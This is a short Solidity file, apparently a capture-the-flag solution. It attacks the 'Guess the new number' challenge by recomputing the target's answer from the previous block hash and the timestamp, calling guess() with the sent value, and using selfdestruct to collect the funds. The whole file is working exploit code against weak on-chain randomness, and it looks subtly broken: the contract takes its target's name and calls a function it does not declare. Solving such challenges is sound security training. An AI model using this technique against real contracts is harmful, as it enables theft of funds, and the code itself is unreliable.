pragma solidity ^0.4.21;
import "./Guessthenewnumber.sol";
contract GuessTheNewNumberChallenge {
    function() public payable{}
    function win(address addr) public payable{
        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(addr);
        target.guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
    }
    function destroy() public{
        selfdestruct(msg.sender);
    }
}